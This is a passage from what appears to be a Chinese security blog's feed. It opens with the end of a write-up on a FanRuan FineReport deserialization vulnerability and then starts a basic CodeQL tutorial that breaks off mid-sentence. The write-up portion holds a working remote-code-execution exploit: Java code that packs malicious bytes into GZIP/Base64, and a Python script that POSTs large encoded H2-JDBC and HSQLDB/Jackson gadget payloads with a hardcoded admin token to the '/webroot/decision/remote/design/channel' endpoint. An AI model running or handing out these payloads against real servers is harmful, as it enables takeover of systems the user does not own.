class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="发送脚本"><a href="#发送脚本" class="headerlink" title="发送脚本"></a>发送脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">host</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    url = host + <span class="string">&quot;/webroot/decision/remote/design/channel&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInRlbmFudElkIjoiZGVmYXVsdCIsImlzcyI6ImZhbnJ1YW4iLCJkZXNjcmlwdGlvbiI6ImFkbWluKGFkbWluKSIsImV4cCI6MTcyMzEzNDgxNiwiaWF0IjoxNzIzMTMxMjE5LCJqdGkiOiJpYnFtcVNSek94RmYrQ3JnUzlXeG5NMDdqT3BYVWF4RHV0czMvNGpTKzBqdGlCSzcifQ.x0xKCO4bR6EVGqEoI7W4es7aRWPn5idSTeOYBleBumM&quot;</span>,</span><br><span class="line">      <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">## h2 jdbc attack rce</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## b = b&quot;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&quot;</span></span><br><span class="line">    <span class="comment">##  hsqldb 打 jackson</span></span><br><span class="line">    b = <span class="string">b&quot;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&quot;</span></span><br><span class="line">    <span class="comment">## b = b&quot;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&quot;</span></span><br><span class="line">    data = base64.b64decode(b)</span><br><span class="line"></span><br><span class="line">    headers[<span class="string">&quot;Content-Length&quot;</span>] = <span class="built_in">str</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, host, <span class="string">&quot;------存在漏洞！&quot;</span>)</span><br><span class="line">      <span class="comment">## print(&quot;[+]&quot;, res.text)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[o]&quot;</span>, host, <span class="string">&quot;------不存在漏洞！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd(<span class="string">&quot;http://localhost:8075&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/X1r0z/JNDIMap">https://github.com/X1r0z/JNDIMap</a></li><li><a href="https://github.com/7wkajk/Frchannel">https://github.com/7wkajk/Frchannel</a></li><li><a href="https://github.com/ax1sX/SecurityList">https://github.com/ax1sX/SecurityList</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。&lt;/p&gt;
&lt;h3 id=&quot;Hashtable链&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="代码审计" scheme="https://jaspersec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 基础</title>
    <link href="https://jaspersec.top/posts/3347678648.html"/>
    <id>https://jaspersec.top/posts/3347678648.html</id>
    <published>2024-07-01T10:31:53.000Z</published>
    <updated>2025-03-31T22:09:47.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CodeQL-概览"><a href="#CodeQL-概览" class="headerlink" title="CodeQL 概览"></a>CodeQL 概览</h2><p>CodeQL是一个静态代码分析引擎，用来给半自动化检查代码中可能存在的漏洞和bug。使用 CodeQL 进行代码审计包括下面三个步骤：</p><ol><li>从源代码中提取必备信息，然后创建 codeql 数据库</li><li>用他人编写好 or 自定义的 ql 语句进行查询</li><li>解释分析查询结果</li></ol><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>创建数据库通常使用固定的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create /codeql-dbs/example-repo --language=&lt;language-label&gt; --source-root /checkouts/example-repo</span><br></pre></td></tr></table></figure><p>当然不同语言存在差异，可以以编译型 &#x2F; 非编译型进行区分，可以参考：<a href="https://docs.github.com/zh/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis">为 CodeQL 分析准备代码</a></p><h4 id="非编译型语言"><a href="#非编译型语言" class="headerlink" title="非编译型语言"></a>非编译型语言</h4><p>非编译型语言构成的项目，其数据库的构建方式通常比较简单，指定源码文件夹和输出文件夹即可。</p><p>Javascript 和 typescript 项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript-typescript --source-root &lt;folder-to-extract&gt; &lt;output-folder&gt;/javascript-database</span><br></pre></td></tr></table></figure><p>Python 项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=python &lt;output-folder&gt;/python-database</span><br></pre></td></tr></table></figure><p>Rubu 项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=ruby --source-root &lt;folder-to-extract&gt; &lt;output-folder&gt;/ruby-database</span><br></pre></td></tr></table></figure><h4 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h4><p>编译型语言的数据库构建相对复杂，因为项目需要先进行编译，然后生成最终的项目，而不同的项目可以使用不同的构建工具进行管理，所以这一块比较复杂。</p><p>codeql-cli 提供了两种思路，一是自动识别进行数据库生成， 二是显式指定生成最终项目的命令，既项目构建的命令。</p><p>例如，自动构建 C++ &#x2F; C 项目的数据库的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=cpp &lt;output-folder&gt;/cpp-database</span><br></pre></td></tr></table></figure><p>而显式指定构建项目的命令来生成 C &#x2F; 